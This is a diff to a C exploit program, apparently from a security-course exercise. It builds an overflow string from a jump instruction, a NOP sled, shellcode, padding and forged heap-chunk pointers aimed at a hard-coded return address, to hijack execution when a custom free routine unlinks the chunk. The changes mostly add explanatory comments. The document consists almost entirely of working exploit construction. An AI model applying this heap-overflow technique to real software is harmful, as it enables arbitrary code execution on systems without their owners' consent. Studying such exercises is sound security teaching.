@@ -17,19 +17,26 @@ int main(void)
   char badStr[360];
   int i=0;
   int shIndex = 0;
+  
+  // jump into the nop sled after tfree returns
   badStr[i++] = 0xeb;
   badStr[i++] = 0x2f;
   badStr[i++] = 0x90;
   badStr[i++] = 0x90;
+  
   // buf[4-7] = &(ret addr) // this is where LSB needs = 1
   *((int *) (badStr+i)) = 0xbffffcdd;
   i+=4;
+
+  // NOP sled followed by shellcode
   for(i; i < 97; i++){
    badStr[i] = 0x90;
   }
   for(shIndex; shIndex < 45;shIndex++){
    badStr[i++] = shellcode[shIndex];
   }
+
+  // padding
   for(i; i < 304;i++){
    badStr[i] = 0x11;
   }
@@ -37,11 +44,11 @@ int main(void)
   // p->s.l = buf
   *((int *) (badStr + i)) = 0x8049a48; // start of p
   i+=4;
-  // p->s.r
+  // p->s.r = &(retAddr)
   *((int *) (badStr + i)) = 0xbffffcdd; 
 
   // pad
-  for(i = i+4; i < 360-1; i++) {
+  for(i=i+4; i < 360-1; i++) {
    badStr[i] = 0x22;
   }
   badStr[i] = 0x0;
